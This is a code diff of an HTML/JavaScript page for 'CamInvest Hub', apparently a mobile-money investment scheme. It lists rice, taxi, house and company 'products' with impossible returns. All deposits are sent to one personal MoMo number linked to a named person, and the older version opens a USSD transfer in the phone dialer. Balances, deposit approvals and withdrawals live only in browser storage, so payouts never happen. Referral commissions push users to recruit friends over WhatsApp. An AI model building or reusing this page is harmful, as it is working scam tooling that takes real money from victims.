@@ -3,131 +3,149 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CamInvest Hub - 678657567</title>
+<title>CamInvest Hub - Official</title>
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:Arial}
-body{background:#0a1931;color:#fff;padding-bottom:70px}
-.top{background:#12244f;padding:8px;text-align:center;font-size:11px;color:#9fb0d0}
-.btns{display:flex;gap:8px;padding:8px 10px}
-.btns button{flex:1;padding:12px;border:0;border-radius:25px;font-weight:800;font-size:13px}
-.icons{background:#fff;margin:10px;border-radius:14px;padding:14px 0;display:flex;justify-content:space-around;color:#000}
-.icons div{text-align:center;font-size:11px;cursor:pointer}
-.plan{display:flex;margin:10px;border-radius:14px;overflow:hidden;background:#fff;color:#000}
-.p-img{width:105px;min-height:115px;background-size:cover;background-position:center;display:flex;align-items:flex-end;padding:6px}
-.p-img span{background:#000;color:#fff;padding:4px 10px;border-radius:15px;font-size:11px;font-weight:800}
-.p-info{flex:1;padding:10px}
-.p-info b{font-size:13px} .p-info small{font-size:11px;color:#555;display:block;line-height:1.3}
-.profit{color:#00a651;font-weight:700;font-size:12px;margin-top:2px}
-.buy{width:100%;background:#0a1931;color:#fff;border:0;padding:10px;border-radius:20px;margin-top:6px;font-weight:700;font-size:12px}
-.page{display:none;padding:10px} .page.active{display:block}
-.task{margin:10px;background:#fff;color:#000;border-radius:12px;padding:12px;display:flex;justify-content:space-between;align-items:center}
-.bottom{position:fixed;bottom:0;left:0;right:0;background:#fff;display:flex;justify-content:space-around;padding:8px 0 10px;border-top:1px solid #ddd;z-index:10}
-.bottom div{font-size:10px;color:#888;text-align:center;cursor:pointer} .bottom .active{color:#0a1931;font-weight:800}
-.modal{position:fixed;inset:0;background:rgba(0,0,0,0.85);display:none;justify-content:center;align-items:flex-start;z-index:99;padding:10px;overflow:auto}
-.box{background:#fff;color:#000;width:100%;max-width:400px;border-radius:16px;padding:16px;margin-top:20px}
-.box input,.box select{width:100%;padding:14px;margin:6px 0 10px;border:1px solid #ccc;border-radius:10px}
-.tip{background:#dcfce7;border:1px solid #16a34a;padding:10px;border-radius:10px;font-size:12px;margin:8px 0}
+*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif}
+body{background:#0a1931;color:white;padding-bottom:80px}
+.top{background:#13294b;padding:10px;text-align:center;font-size:13px;position:sticky;top:0;z-index:99}
+.live{color:#00ff88;animation:blink 1s infinite}@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+.btns{display:flex;gap:10px;padding:12px}
+.btns button{flex:1;padding:12px;border-radius:25px;border:none;font-weight:bold;color:white}
+.green{background:#00c851}.yellow{background:#ffbb00;color:#000}
+.nav2{display:flex;background:white;border-radius:15px;margin:0 12px;padding:10px;justify-content:space-around;color:#333}
+.nav2 div{text-align:center;font-size:12px}
+.hero{margin:15px;background:linear-gradient(135deg,#1e3c72,#2a5298);border-radius:15px;padding:20px;text-align:center}
+.hero h1{font-size:32px}.hero p{opacity:0.8}
+.card{background:white;color:#333;margin:12px;border-radius:15px;display:flex;overflow:hidden}
+.card img{width:100px;height:100px;object-fit:cover}
+.card.info{padding:10px;flex:1}.card.info b{color:#0a1931}
+.buy{width:100%;background:#0a1931;color:white;border:none;padding:10px;border-radius:20px;margin-top:8px;font-weight:bold}
+.bottom{position:fixed;bottom:0;left:0;right:0;background:white;display:flex;justify-content:space-around;padding:8px 0;color:#888}
+.bottom div.active{color:#0a1931}.bottom div{font-size:11px;text-align:center}
+.page{display:none;padding:10px}.page.active{display:block}
+.whitebox{background:white;color:#333;border-radius:12px;padding:15px;margin:10px 0}
+.input{width:100%;padding:12px;margin:8px 0;border:1px solid #ccc;border-radius:8px}
+.action{background:#0a1931;color:white;border:none;width:100%;padding:12px;border-radius:8px;font-weight:bold;margin-top:8px}
+.admin-btn{background:#ffbb00;color:#000;border:2px solid #000;width:100%;padding:12px;border-radius:8px;font-weight:bold;margin-top:12px}
 </style>
 </head>
 <body>
 
-<div class="top">Balance: <b id="bal" style="color:#fff">115F</b> | Video: <span id="vid">0</span>/10 | Receiver: 678657567</div>
+<div class="top"><span class="live">● LIVE</span> | Total Assets: <span id="balTop">135F</span> | Video: <span id="vidTop">2/10</span> | Receiver: 678657567</div>
 
 <div class="btns">
-<button style="background:#00c853;color:#fff" onclick="shareWA()">WhatsApp Share</button>
-<button style="background:#ffca28;color:#000" onclick="copyL()">COPY LINK</button>
-</div>
-<div id="link" style="display:none">https://caminvest-hub.vercel.app/?ref=CAMI-678657567</div>
-
-<div class="icons">
-<div onclick="openD()">💳<br>Recharge</div>
-<div onclick="openW()">🏧<br>Withdraw</div>
-<div onclick="showPage('tasks')">🎬<br>Tasks</div>
-<div onclick="showPage('team')">👥<br>Team</div>
+<button class="green" onclick="shareWA()">WhatsApp Share</button>
+<button class="yellow" onclick="copyLink()">COPY LINK</button>
 </div>
 
-<!-- HOME PAGE -->
+<div class="nav2">
+<div onclick="go('recharge')">💳<br>Recharge</div>
+<div onclick="go('withdraw')">🏧<br>Withdraw</div>
+<div onclick="go('tasks')">📋<br>Tasks</div>
+<div onclick="go('team')">👥<br>Team</div>
+</div>
+
 <div id="home" class="page active">
-<div style="padding:8px 10px;font-weight:800;font-size:14px">🔥 Products 200F - 400,000F | Rice, Car, House, Company</div>
-<div class="plan"><div class="p-img" style="background-image:url('https://images.unsplash.com/photo-1586201375761-83865001e31c?w=300')"><span>200F</span></div><div class="p-info"><b>🌾 Rice Investment 200F</b><small>Buy 1 bag rice, sell profit</small><small>40F/day x 365D = 14,600F</small><div class="profit">Profit: 14,400F</div><button class="buy" onclick="buyP('Rice 200F',200)">BUY NOW 200F</button></div></div>
-<div class="plan"><div class="p-img" style="background-image:url('https://images.unsplash.com/photo-1556740738-b6a63e27c4df?w=300')"><span>500F</span></div><div class="p-info"><b>🏪 Small Shop 500F</b><small>Invest in provision store</small><small>165F/day x 30D = 4,950F</small><div class="profit">Profit: 4,450F</div><button class="buy" onclick="buyP('Shop 500F',500)">BUY NOW 500F</button></div></div>
-<div class="plan"><div class="p-img" style="background-image:url('https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=300')"><span>1KF</span></div><div class="p-info"><b>📱 Phone Business 1,000F</b><small>Buy & sell phones</small><small>350F/day x 30D = 10,500F</small><div class="profit">Profit: 9,500F</div><button class="buy" onclick="buyP('Phone 1K',1000)">BUY NOW 1,000F</button></div></div>
-<div class="plan"><div class="p-img" style="background-image:url('https://images.unsplash.com/photo-1558981403-c5f9899a28bc?w=300')"><span>5KF</span></div><div class="p-info"><b>🏍️ Moto Taxi 5,000F</b><small>Invest in okada business</small><small>1,800F/day x 30D = 54,000F</small><div class="profit">Profit: 49,000F</div><button class="buy" onclick="buyP('Moto 5K',5000)">BUY NOW 5,000F</button></div></div>
-<div class="plan"><div class="p-img" style="background-image:url('https://images.unsplash.com/photo-1494976388531-d1058494cdd8?w=300')"><span>20KF</span></div><div class="p-info"><b>🚗 Car Taxi 20,000F</b><small>Invest in car taxi business</small><small>7,500F/day x 30D = 225,000F</small><div class="profit">Profit: 205,000F</div><button class="buy" onclick="buyP('Car 20K',20000)">BUY NOW 20,000F</button></div></div>
-<div class="plan"><div class="p-img" style="background-image:url('https://images.unsplash.com/photo-1568605114967-8130f3a36994?w=300')"><span>100KF</span></div><div class="p-info"><b>🏠 House Rental 100,000F</b><small>Buy house, collect rent</small><small>40,000F/day x 30D = 1.2M</small><div class="profit">Profit: 1,100,000F</div><button class="buy" onclick="buyP('House 100K',100000)">BUY NOW 100,000F</button></div></div>
-<div class="plan"><div class="p-img" style="background-image:url('https://images.unsplash.com/photo-1492144534655-ae79c964c9d7?w=300')"><span>400KF</span></div><div class="p-info"><b>💎 Luxury + Company 400,000F</b><small>CEO share + luxury car</small><small>180,000F/day x 30D = 5.4M</small><div class="profit">Profit: 5,000,000F</div><button class="buy" onclick="buyP('Luxury 400K',400000)">BUY NOW 400,000F</button></div></div>
+<div class="hero"><p>To: 678657567 Ambokia Promise</p><h1 id="balHero">135 F</h1><p>Balance - All Deposits TO 678657567</p></div>
+<div style="padding:0 12px;font-weight:bold">🔥 Products 200F - 400,000F | Rice, Car, House, Company</div>
+<div id="products"></div>
 </div>
 
-<!-- ORDERS PAGE -->
-<div id="orders" class="page">
-<h3 style="padding:10px">📋 My Orders</h3>
-<div id="ordersList" style="background:#fff;color:#000;margin:10px;border-radius:12px;padding:15px">No orders yet. Buy a product!</div>
-</div>
+<div id="orders" class="page"><h3>📦 My Orders</h3><div id="ordersList" class="whitebox">No orders yet. Buy a product!</div></div>
+<div id="tasks" class="page"><h3>📋 Tasks - Watch to Earn</h3><div class="whitebox">Video <span id="vid">2</span>/10 - 50F per video<div style="margin-top:10px"><button class="action" onclick="watchVid()">▶️ Watch Video +50F</button></div></div></div>
+<div id="team" class="page"><h3>👥 Team</h3><div class="whitebox">Your Invite Link:<br><b id="teamLink">https://hub.vercel.app?ref=678657567</b><br><br>Invite friends to earn 10%!<br><button class="action" onclick="shareWA()">Share on WhatsApp</button></div></div>
 
-<!-- TASKS PAGE -->
-<div id="tasks" class="page">
-<h3 style="padding:10px">🎬 Tasks - Watch & Earn 105F/day</h3>
-<div class="task"><span>Task 1 - Watch TikTok 30s = 10.5F</span><button onclick="doTask(1)" style="background:#0a1931;color:#fff;border:0;padding:8px 14px;border-radius:15px">Watch</button></div>
-<div class="task"><span>Task 2 - Watch TikTok 30s = 10.5F</span><button onclick="doTask(2)" style="background:#0a1931;color:#fff;border:0;padding:8px 14px;border-radius:15px">Watch</button></div>
-<div class="task"><span>Task 3 - Watch TikTok 30s = 10.5F</span><button onclick="doTask(3)" style="background:#0a1931;color:#fff;border:0;padding:8px 14px;border-radius:15px">Watch</button></div>
-<div class="task"><span>Task 4-10 - Same</span><button onclick="doTask(4)" style="background:#0a1931;color:#fff;border:0;padding:8px 14px;border-radius:15px">Watch</button></div>
-<div style="background:#fff;color:#000;margin:10px;border-radius:12px;padding:12px;font-size:12px">Complete 10 videos daily = 105F. Resets every 24h.</div>
-</div>
-
-<!-- TEAM PAGE -->
-<div id="team" class="page">
-<h3 style="padding:10px">👥 My Team</h3>
-<div style="background:#fff;color:#000;margin:10px;border-radius:12px;padding:15px">
-<p>Referral Link:</p>
-<b id="refLink2" style="word-break:break-all;color:#0a1931">https://caminvest-hub.vercel.app/?ref=CAMI-678657567</b><br><br>
-<button onclick="copyL()" style="width:100%;background:#ffca28;padding:12px;border:0;border-radius:10px;font-weight:800">COPY LINK</button><br><br>
-<p style="font-size:12px">15% commission when friend deposits to 678657567<br>Team earnings: <b id="teamEarn">0F</b></p>
-</div>
-</div>
-
-<!-- ME PAGE -->
 <div id="me" class="page">
-<h3 style="padding:10px">👤 Me</h3>
-<div style="background:#fff;color:#000;margin:10px;border-radius:12px;padding:15px">
-<p>Phone: <b id="mePhone">Not set</b></p>
-<p>Balance: <b id="meBal">115F</b></p>
-<p>Receiver Account: <b>678657567 - Ambokia Promise</b></p>
-<br>
-<button onclick="openD()" style="width:100%;background:#00c853;color:#fff;padding:12px;border:0;border-radius:10px;margin-bottom:8px">Recharge to 678657567</button>
-<button onclick="openW()" style="width:100%;background:#0a1931;color:#fff;padding:12px;border:0;border-radius:10px">Withdraw FROM 678657567</button>
+<h3>👤 Me</h3>
+<div class="whitebox">
+Phone: <b id="myPhone">678657567</b><br>
+Balance: <b id="balMe">135F</b><br>
+Receiver Account: <b>678657567 - Ambokia Promise</b><br><br>
+<button class="action" style="background:#00c851" onclick="go('recharge')">Recharge to 678657567</button>
+<button class="action" onclick="go('withdraw')">Withdraw FROM 678657567</button>
+<button class="admin-btn" onclick="openAdmin()">🔐 Admin - View Deposits to 678657567</button>
+<button class="action" style="background:#ddd;color:#333" onclick="logout()">Logout</button>
 </div>
 </div>
 
-<!-- MODALS -->
-<div id="depM" class="modal"><div class="box"><h3>💳 Recharge to 678657567</h3><input id="dPhone" placeholder="Your MoMo Number"><input id="dAmt" type="number" value="200"><select id="dMet"><option>MTN MoMo</option><option>Orange Money</option></select><div class="tip">Receiver: <b>678657567</b><br>USSD: *126*1*1*678657567*amount#<br>Enter PIN = Real money to YOU</div><button onclick="doDep()" style="width:100%;background:#ffca28;padding:14px;border:0;border-radius:12px;font-weight:800">📞 SUBMIT & OPEN DIALER</button><button onclick="closeM()" style="width:100%;background:#eee;padding:10px;border:0;border-radius:10px;margin-top:8px">Cancel</button></div></div>
-<div id="withM" class="modal"><div class="box"><h3>🏧 Withdraw FROM 678657567</h3><input id="wAmt" type="number" placeholder="Min 200"><input id="wMo" placeholder="Your MoMo to receive"><div class="tip">FROM 678657567 TO your number</div><button onclick="doWith()" style="width:100%;background:#0a1931;color:#fff;padding:14px;border:0;border-radius:12px">WITHDRAW</button><button onclick="closeM()" style="width:100%;background:#eee;padding:10px;border:0;border-radius:10px;margin-top:8px">Cancel</button></div></div>
+<div id="recharge" class="page"><h3>💳 Recharge TO 678657567</h3>
+<div class="whitebox">
+<p>Receiver: <b>678657567 - Ambokia Promise (MTN MoMo)</b></p>
+<input id="rAmount" class="input" placeholder="Enter Amount e.g. 500">
+<input id="rTrans" class="input" placeholder="MoMo Transaction ID">
+<button class="action" onclick="doRecharge()">Submit Deposit to 678657567</button>
+<div id="rList" style="margin-top:15px"></div>
+<button class="action" style="background:#888" onclick="go('home')">Back Home</button>
+</div></div>
+
+<div id="withdraw" class="page"><h3>🏧 Withdraw FROM 678657567</h3>
+<div class="whitebox">
+Balance: <b id="balW">135F</b><br>
+<input id="wAmount" class="input" placeholder="Amount to withdraw">
+<input id="wPhone" class="input" placeholder="Your MoMo Number to receive FROM 678657567">
+<button class="action" onclick="doWithdraw()">Request Withdraw FROM 678657567</button>
+<div id="wList" style="margin-top:15px"></div>
+<button class="action" style="background:#888" onclick="go('home')">Back Home</button>
+</div></div>
+
+<div id="adminModal" style="display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.9);z-index:999;padding:15px;overflow:auto">
+<div class="whitebox">
+<h2>🔐 Admin Panel - 678657567</h2>
+<input id="pin" class="input" placeholder="Enter PIN 6786" type="password">
+<button class="action" onclick="checkPin()">Unlock</button>
+<div id="adminContent" style="display:none;margin-top:15px">
+<h3>All Deposits TO 678657567:</h3>
+<div id="allDeposits"></div>
+<h3 style="margin-top:15px">Withdraw Requests FROM 678657567:</h3>
+<div id="allWithdraws"></div>
+<button class="action" style="background:red;margin-top:15px" onclick="closeAdmin()">Close Admin</button>
+</div>
+</div>
+</div>
 
 <div class="bottom">
-<div id="b-home" class="active" onclick="showPage('home')">🏠<br>Home</div>
-<div id="b-orders" onclick="showPage('orders')">📋<br>Orders</div>
-<div id="b-tasks" onclick="showPage('tasks')">🎬<br>Tasks</div>
-<div id="b-team" onclick="showPage('team')">👥<br>Team</div>
-<div id="b-me" onclick="showPage('me')">👤<br>Me</div>
+<div class="active" onclick="go('home')" id="bHome">🏠<br>Home</div>
+<div onclick="go('orders')" id="bOrders">📦<br>Orders</div>
+<div onclick="go('tasks')" id="bTasks">📋<br>Tasks</div>
+<div onclick="go('team')" id="bTeam">👥<br>Team</div>
+<div onclick="go('me')" id="bMe">👤<br>Me</div>
 </div>
 
 <script>
-const MY="678657567";
-let bal=parseInt(localStorage.getItem('c_bal')||'115');
-let vid=parseInt(localStorage.getItem('c_vid')||'0');
-let orders=JSON.parse(localStorage.getItem('c_orders')||'[]');
-let phone=localStorage.getItem('c_phone')||'';
-function upd(){document.getElementById('bal').innerText=bal+'F';document.getElementById('meBal').innerText=bal+'F';document.getElementById('vid').innerText=vid;document.getElementById('mePhone').innerText=phone||'Not set';document.getElementById('link').innerText='https://caminvest-hub.vercel.app/?ref=CAMI-'+(phone||MY);document.getElementById('refLink2').innerText='https://caminvest-hub.vercel.app/?ref=CAMI-'+(phone||MY);let list=document.getElementById('ordersList');if(orders.length==0){list.innerHTML='No orders yet';}else{list.innerHTML=orders.map(o=>'<div style="border-bottom:1px solid #eee;padding:8px 0">'+o.name+' - '+o.price+'F - '+new Date(o.time).toLocaleDateString()+'</div>').join('');}}
-upd();
-function showPage(p){document.querySelectorAll('.page').forEach(x=>x.classList.remove('active'));document.getElementById(p).classList.add('active');document.querySelectorAll('.bottom div').forEach(x=>x.classList.remove('active'));document.getElementById('b-'+p).classList.add('active');}
-function openD(){document.getElementById('dPhone').value=phone;document.getElementById('depM').style.display='flex';}
-function openW(){document.getElementById('wMo').value=phone;document.getElementById('withM').style.display='flex';}
-function closeM(){document.getElementById('depM').style.display='none';document.getElementById('withM').style.display='none';}
-function doDep(){let p=document.getElementById('dPhone').value.trim();let a=document.getElementById('dAmt').value.trim();let m=document.getElementById('dMet').value;if(!p||!a||a<200)return alert('Enter phone min 200F');localStorage.setItem('c_phone',p);phone=p;upd();let ussd=m.includes('MTN')?`*126*1*1*${MY}*${a}#`:`#150*1*1*${MY}*${a}#`;if(confirm('Send REAL '+a+'F to '+MY+'?\n'+ussd)){location.href='tel:'+encodeURIComponent(ussd);setTimeout(()=>{let t=prompt('Enter Transaction ID after sending '+a+'F to '+MY+':');if(t){alert('✅ Txn '+t+' submitted! Will verify on '+MY);closeM();}},6000);}}
-function doWith(){let a=parseInt(document.getElementById('wAmt').value);let mo=document.getElementById('wMo').value.trim();if(!a||!mo||a<200)return alert('Min 200F');if(a>bal)return alert('Low balance '+bal+'F');bal-=a;localStorage.setItem('c_bal',bal);upd();alert('⏳ Withdraw '+a+'F FROM '+MY+' TO '+mo+' pending - Send manually from MoMo app');closeM();}
-function buyP(name,price){if(bal<price)return alert('Need '+price+'F have '+bal+'F - Recharge to '+MY);bal-=price;orders.push({name:name,price:price,time:Date.now()});localStorage.setItem('c_bal',bal);localStorage.setItem('c_orders',JSON.stringify(orders));upd();alert('✅ Bought '+name);showPage('orders');}
-function doTask(n){if(vid>=10)return alert('10/10 done today!');vid++;bal+=10;localStorage.setItem('c_vid',vid);localStorage.setItem('c_bal',bal);upd();alert('✅ Task '+n+' done +10F! Now '+vid+'/10');window.open('https://www.tiktok.com','_blank');}
-function copyL(){navigator.clipboard.writeText(document.getElementById('link').innerText);alert('Copied: '+document.getElementById('link').innerText);}
-function shareWA(){let l=document.getElementById('link').innerText;window.open('https://wa.me/?text='+encodeURIComponent('Join CamInvest! Rice, Car, House, Company 200F-400KF! Earn daily! '+l),'_blank');}
+let bal=parseInt(localStorage.getItem('bal')||'135');
+let vids=parseInt(localStorage.getItem('vids')||'2');
+let orders=JSON.parse(localStorage.getItem('orders')||'[]');
+let deps=JSON.parse(localStorage.getItem('deps')||'[]');
+let withs=JSON.parse(localStorage.getItem('withs')||'[]');
+let products=[
+{name:'Rice Investment 200F',price:200,img:'https://images.unsplash.com/photo-1586201375761-83865001e31c?w=200',desc:'Buy 1 bag rice, sell profit',profit:'40F/day x 365D = 14,600F',net:'Profit: 14,400F'},
+{name:'Small Shop 500F',price:500,img:'https://images.unsplash.com/photo-1556742049-0cfed4f6a45d?w=200',desc:'Invest in provision store',profit:'165F/day x 30D = 4,950F',net:'Profit: 4,450F'},
+{name:'Phone Business 1,000F',price:1000,img:'https://images.unsplash.com/photo-1511707171634-5f897ff02aa9?w=200',desc:'Buy & sell phones',profit:'350F/day x 30D = 10,500F',net:'Profit: 9,500F'},
+{name:'Moto Taxi 5,000F',price:5000,img:'https://images.unsplash.com/photo-1558981852-426c6c22a060?w=200',desc:'Invest in okada business',profit:'800F/day x 30D',net:'Profit: 19,000F'},
+{name:'Car Business 20,000F',price:20000,img:'https://images.unsplash.com/photo-1494976388531-d1058494cdd8?w=200',desc:'Car rental business',profit:'2,500F/day x 30D',net:'Profit: 55,000F'},
+{name:'House Rental 100,000F',price:100000,img:'https://images.unsplash.com/photo-1560518883-ce09059eeffa?w=200',desc:'Build mini house for rent',profit:'8,000F/day x 60D',net:'Profit: 380,000F'},
+{name:'Company 400,000F',price:400000,img:'https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?w=200',desc:'Own company share',profit:'25,000F/day x 90D',net:'Profit: 1,850,000F'}
+];
+function renderProducts(){
+let h='';products.forEach(p=>{h+=`<div class="card"><img src="${p.img}"><div class="info"><b>${p.name}</b><br><small>${p.desc}</small><br><small style="color:green">${p.profit}<br><b>${p.net}</b></small><br><button class="buy" onclick="buy(${p.price},'${p.name}')">BUY NOW ${p.price}F</button></div></div>`});document.getElementById('products').innerHTML=h;
+}
+function updateBal(){document.getElementById('balTop').innerText=bal+'F';document.getElementById('balHero').innerText=bal+' F';document.getElementById('balMe').innerText=bal+'F';document.getElementById('balW').innerText=bal+'F';document.getElementById('vidTop').innerText=vids+'/10';document.getElementById('vid').innerText=vids;localStorage.setItem('bal',bal);localStorage.setItem('vids',vids);}
+function go(p){document.querySelectorAll('.page').forEach(x=>x.classList.remove('active'));document.getElementById(p).classList.add('active');document.querySelectorAll('.bottom div').forEach(x=>x.classList.remove('active'));let b=document.getElementById('b'+p.charAt(0).toUpperCase()+p.slice(1));if(b)b.classList.add('active');if(p=='orders')renderOrders();if(p=='recharge')renderDeps();if(p=='withdraw')renderWiths();}
+function buy(price,name){if(bal<price){alert('Low balance! Please Recharge TO 678657567 first');go('recharge');return}bal-=price;orders.push({name,price,date:new Date().toLocaleString()});localStorage.setItem('orders',JSON.stringify(orders));updateBal();alert('Bought '+name+'! Earning daily!');renderOrders();go('orders');}
+function renderOrders(){if(orders.length==0){document.getElementById('ordersList').innerHTML='No orders yet';return}let h='';orders.forEach(o=>{h+=`<div style="border-bottom:1px solid #eee;padding:8px 0"><b>${o.name}</b><br>${o.price}F - ${o.date}</div>`});document.getElementById('ordersList').innerHTML=h;}
+function watchVid(){if(vids>=10){alert('Limit 10 per day!');return}vids++;bal+=50;updateBal();localStorage.setItem('vids',vids);alert('+50F added!');}
+function doRecharge(){let a=document.getElementById('rAmount').value;let t=document.getElementById('rTrans').value;if(!a||!t){alert('Enter amount and Transaction ID');return}deps.push({amount:a,trans:t,date:new Date().toLocaleString(),status:'Pending to 678657567'});localStorage.setItem('deps',JSON.stringify(deps));alert('Deposit submitted to 678657567! Admin will verify!');renderDeps();document.getElementById('rAmount').value='';document.getElementById('rTrans').value='';}
+function renderDeps(){let h='<b>Your Deposits TO 678657567:</b><br>';if(deps.length==0)h+='No deposits yet';deps.forEach(d=>{h+=`<div style="border-bottom:1px solid #eee;padding:5px 0">${d.amount}F - ${d.trans} - ${d.date} - ${d.status}</div>`});document.getElementById('rList').innerHTML=h;}
+function doWithdraw(){let a=document.getElementById('wAmount').value;let p=document.getElementById('wPhone').value;if(!a||!p){alert('Enter amount and phone');return}if(parseInt(a)>bal){alert('Insufficient balance!');return}bal-=parseInt(a);withs.push({amount:a,phone:p,date:new Date().toLocaleString(),status:'Pending FROM 678657567'});localStorage.setItem('withs',JSON.stringify(withs));localStorage.setItem('bal',bal);updateBal();alert('Withdraw request FROM 678657567 submitted!');renderWiths();}
+function renderWiths(){let h='<b>Your Withdrawals FROM 678657567:</b><br>';if(withs.length==0)h+='No withdrawals';withs.forEach(w=>{h+=`<div style="border-bottom:1px solid #eee;padding:5px 0">${w.amount}F to ${w.phone} - ${w.date}</div>`});document.getElementById('wList').innerHTML=h;}
+function openAdmin(){document.getElementById('adminModal').style.display='block';}
+function closeAdmin(){document.getElementById('adminModal').style.display='none';}
+function checkPin(){if(document.getElementById('pin').value=='6786'){document.getElementById('adminContent').style.display='block';let dh='';if(deps.length==0)dh='No deposits yet';else deps.forEach((d,i)=>{dh+=`<div style="border:1px solid #ccc;padding:8px;margin:5px 0">${d.amount}F - ID:${d.trans}<br>${d.date}<br><button onclick="approveDep(${i})">Approve +${d.amount}F</button></div>`});document.getElementById('allDeposits').innerHTML=dh;let wh='';if(withs.length==0)wh='No withdraws';else withs.forEach(w=>{wh+=`<div style="border:1px solid #ccc;padding:8px;margin:5px 0">${w.amount}F to ${w.phone}<br>${w.date}</div>`});document.getElementById('allWithdraws').innerHTML=wh;}else alert('Wrong PIN! Use 6786');}
+function approveDep(i){let amt=parseInt(deps[i].amount);bal+=amt;deps[i].status='Approved TO 678657567';localStorage.setItem('deps',JSON.stringify(deps));localStorage.setItem('bal',bal);updateBal();alert('Approved '+amt+'F!');checkPin();}
+function shareWA(){let link='https://hub.vercel.app?ref='+document.getElementById('myPhone').innerText;window.open('https://wa.me/?text=Join CamInvest Hub Earn Daily! '+encodeURIComponent(link));}
+function copyLink(){navigator.clipboard.writeText('https://hub.vercel.app?ref=678657567');alert('Link copied!');}
+function logout(){localStorage.clear();location.reload();}
+renderProducts();updateBal();renderDeps();renderWiths();
 </script>
 </body>
 </html>
